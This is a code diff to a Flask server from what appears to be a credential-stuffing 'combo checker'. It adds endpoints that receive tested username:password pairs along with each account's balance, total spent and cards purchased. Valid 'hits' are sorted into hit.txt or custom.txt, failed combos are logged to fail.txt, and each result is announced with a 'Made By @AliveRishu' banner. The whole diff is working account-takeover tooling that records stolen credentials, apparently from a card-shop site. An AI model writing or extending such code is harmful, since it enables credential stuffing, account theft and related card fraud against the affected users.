@@ -329,16 +329,54 @@ def report_hit():
     username = data.get("username")
     password = data.get("password")
     balance = data.get("balance")
-    totalCCS = data.get("totalCCS")
-    amounts = data.get("amounts")
-    refunds = data.get("refunds")
-    if not all([username, password, balance, totalCCS, amounts, refunds]):
+    totalSpent = data.get("totalSpent")
+    cardsPurchased = data.get("cardsPurchased")
+    
+    if not all([username, password, balance, totalSpent, cardsPurchased]):
         return jsonify({"error": "Missing data"}), 400
-    hit_file = os.path.join(HIT_FOLDER, "hit.txt")
-    with open(hit_file, "a") as f:
-        f.write(f"{username}:{password} Balance: {balance} $, Total CCS {totalCCS}, Amounts {amounts}$, Refunds {refunds}\n")
-    print_status(f"💰 HIT! Account: {username} | Balance: ${balance}", "success")
+    
+    # Check if balance is 0.00 (FREE HIT)
+    if balance == "0.00" or balance == "0.00 $":
+        # Save as CUSTOM (FREE HIT)
+        custom_file = os.path.join(HIT_FOLDER, "custom.txt")
+        with open(custom_file, "a") as f:
+            f.write(f"{username}:{password} | Balance: {balance} | Total Spent: {totalSpent} | Cards: {cardsPurchased}\n")
+        
+        # Display CUSTOM hit
+        print_status(f"{Fore.YELLOW}[ CUSTOM ] [ COMBO ] [ CAPTURES ] {username} | Balance: {balance} | Total Spent: {totalSpent} | Cards: {cardsPurchased}", "warning")
+        print_status(f"{Fore.YELLOW}Made By 🔥 @AliveRishu 🔥", "warning")
+        
+    else:
+        # Save as regular HIT
+        hit_file = os.path.join(HIT_FOLDER, "hit.txt")
+        with open(hit_file, "a") as f:
+            f.write(f"{username}:{password} | Balance: {balance} | Total Spent: {totalSpent} | Cards: {cardsPurchased}\n")
+        
+        # Display HIT
+        print_status(f"{Fore.GREEN}[ HIT ] [ COMBO ] [ CAPTURES ] {username} | Balance: {balance} | Total Spent: {totalSpent} | Cards: {cardsPurchased}", "success")
+        print_status(f"{Fore.GREEN}Made By 🔥 @AliveRishu 🔥", "success")
+    
     logger.info('Logged hit: %s', username)
+    return jsonify({"status": "success"})
+
+@app.route("/report-fail", methods=["POST"])
+def report_fail():
+    data = request.json
+    username = data.get("username")
+    password = data.get("password")
+    if not username or not password:
+        return jsonify({"error": "Missing username or password"}), 400
+    
+    # Save as FAIL
+    fail_file = os.path.join(HIT_FOLDER, "fail.txt")
+    with open(fail_file, "a") as f:
+        f.write(f"{username}:{password}\n")
+    
+    # Display FAIL
+    print_status(f"{Fore.RED}[ FAIL ] [ COMBO ] {username}:{password}", "error")
+    print_status(f"{Fore.RED}Made By 🔥 @AliveRishu 🔥", "error")
+    
+    logger.info('Logged fail: %s', username)
     return jsonify({"status": "success"})
 
 @app.route("/status", methods=["GET"])
